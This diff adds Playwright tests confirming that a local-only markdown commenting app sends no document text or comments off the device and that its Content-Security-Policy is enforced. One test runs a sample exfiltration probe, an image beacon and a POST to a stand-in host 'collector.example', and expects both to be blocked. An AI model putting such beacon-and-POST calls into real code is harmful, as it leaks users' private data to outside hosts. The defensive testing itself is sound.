@@ -506,3 +506,114 @@ test('layout: wider document, whole-document comments on top, getting-started no
   await expect(page.locator('.doc-comments .thread')).toHaveCount(0)
   await expect(page.locator('.doc-comments').getByRole('button', {name: 'Comment on the whole document'})).toBeVisible()
 })
+
+test('local only: nothing leaves the device while opening, commenting and saving', async ({page, baseURL}) => {
+  const origin = new URL(baseURL!).origin
+  const traffic: Array<{url: string; method: string; body: string}> = []
+  page.on('request', (request) => traffic.push({url: request.url(), method: request.method(), body: request.postData() ?? ''}))
+  page.on('websocket', (socket) => traffic.push({url: socket.url(), method: 'WEBSOCKET', body: ''}))
+  const failed: Array<{url: string; error: string}> = []
+  const completed: string[] = []
+  page.on('requestfailed', (request) => failed.push({url: request.url(), error: request.failure()?.errorText ?? ''}))
+  page.on('requestfinished', (request) => completed.push(request.url()))
+  await page.addInitScript(() => {
+    localStorage.setItem('sidemark.author', '@private')
+    const seen: string[] = []
+    ;(window as unknown as {__blocked: string[]}).__blocked = seen
+    document.addEventListener('securitypolicyviolation', (event) => seen.push(`${event.effectiveDirective} ${event.blockedURI}`))
+  })
+  await page.goto('./')
+
+  // A document whose text must never appear in any request, with a remote
+  // image (a classic "tracking pixel") and an ordinary link.
+  const marker = `PRIVATE-${Date.now().toString(36)}`
+  const source = [
+    '# Confidential plan',
+    '',
+    `The ${marker} launch is on the fifth.`,
+    '',
+    '![Team photo](https://images.example.com/team.png?doc=secret)',
+    '',
+    'Background is on [the site](https://example.com/).',
+    ''
+  ].join('\n')
+  await page.getByTestId('file-input').setInputFiles({name: 'plan.md', mimeType: 'text/markdown', buffer: Buffer.from(source)})
+  await expect(page.locator('.doc-body h1')).toHaveText('Confidential plan')
+
+  // The remote image is a placeholder, not an <img>.
+  await expect(page.locator('.sm-image-placeholder')).toContainText('Image: Team photo')
+  await expect(page.locator('.doc-body img')).toHaveCount(0)
+  await expect(page.getByRole('note')).toContainText('1 remote image')
+
+  // Comment, reply and save (download).
+  await selectText(page, `${marker} launch`)
+  await draftBox(page).getByRole('textbox').click()
+  await page.keyboard.type(`Comment-${marker}`)
+  await page.keyboard.press('ControlOrMeta+Enter')
+  await page.getByRole('textbox', {name: 'Reply'}).fill(`Reply-${marker}`)
+  await page.getByRole('button', {name: 'Reply', exact: true}).click()
+  const downloading = page.waitForEvent('download')
+  await page.getByRole('button', {name: 'Download'}).click()
+  const saved = await readFile((await (await downloading).path())!, 'utf8')
+  expect(saved).toContain(`Comment-${marker}`)
+  expect(saved).toContain(`Reply-${marker}`)
+
+  // Everything the app itself did: every request stayed on the page's own
+  // origin (or was a local data:/blob: URL), all GETs for the page's files.
+  const appTraffic = [...traffic]
+  const external = appTraffic.filter((r) => !r.url.startsWith(`${origin}/`) && !/^(data|blob):/.test(r.url))
+  expect(external).toEqual([])
+  expect(appTraffic.every((r) => r.method === 'GET')).toBe(true)
+  // And no request carried the document's text or the comments.
+  const leaks = appTraffic.filter((r) => `${r.url} ${r.body}`.includes(marker) || `${r.url} ${r.body}`.includes('Confidential'))
+  expect(leaks).toEqual([])
+  console.log(`local-only: ${appTraffic.length} requests, all GET to ${origin}: ${appTraffic.map((r) => new URL(r.url).pathname).join(', ')}`)
+
+  // The policy is enforced by the browser, not just by our code: a script
+  // that tried to send data out would be blocked.
+  const attempt = await page.evaluate(async () => {
+    const image = new Image()
+    image.src = 'https://collector.example/pixel.png?leak=1'
+    try {
+      await fetch('https://collector.example/leak', {method: 'POST', body: 'leak'})
+      return 'sent'
+    } catch {
+      return 'blocked'
+    }
+  })
+  expect(attempt).toBe('blocked')
+  await expect
+    .poll(() => page.evaluate(() => (window as unknown as {__blocked: string[]}).__blocked))
+    .toEqual(expect.arrayContaining([expect.stringMatching(/^connect-src https:\/\/collector\.example/), expect.stringMatching(/^img-src https:\/\/collector\.example/)]))
+  // Chromium reports the blocked image as a request that failed before it
+  // reached the network; nothing to collector.example ever completed.
+  expect(completed.filter((url) => url.includes('collector.example'))).toEqual([])
+  for (const request of traffic.slice(appTraffic.length)) {
+    expect(failed.find((f) => f.url === request.url)?.error, request.url).toMatch(/BLOCKED_BY_CSP|csp/i)
+  }
+  console.log(`local-only probe: ${JSON.stringify(failed)}`)
+})
+
+test('local only: the statement is always visible and explains itself', async ({page}) => {
+  await page.goto('./')
+  const badge = page.getByRole('button', {name: /Local only/})
+  await expect(badge).toBeVisible()
+  await badge.click()
+  const panel = page.getByRole('region', {name: 'Local only: how do I know?'})
+  await expect(panel).toContainText('no server behind the editor, no account and no analytics')
+  await expect(panel).toContainText('Content-Security-Policy')
+  await panel.getByRole('button', {name: 'Close'}).click()
+  await expect(panel).toHaveCount(0)
+  // The first-open note leads with it, and links to the same explanation.
+  const intro = page.getByRole('complementary', {name: 'Getting started'})
+  await expect(intro.locator('.intro-title')).toHaveText('Private: your files stay on this device')
+  await intro.getByRole('button', {name: 'How do I know?'}).click()
+  await expect(panel).toBeVisible()
+  // The badge stays after the note is dismissed.
+  await intro.getByRole('button', {name: 'Got it'}).click()
+  await expect(badge).toBeVisible()
+  // The built page carries the strict policy.
+  const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')
+  expect(policy).toContain("connect-src 'none'")
+  expect(policy).toContain("img-src 'self' data: blob:")
+})
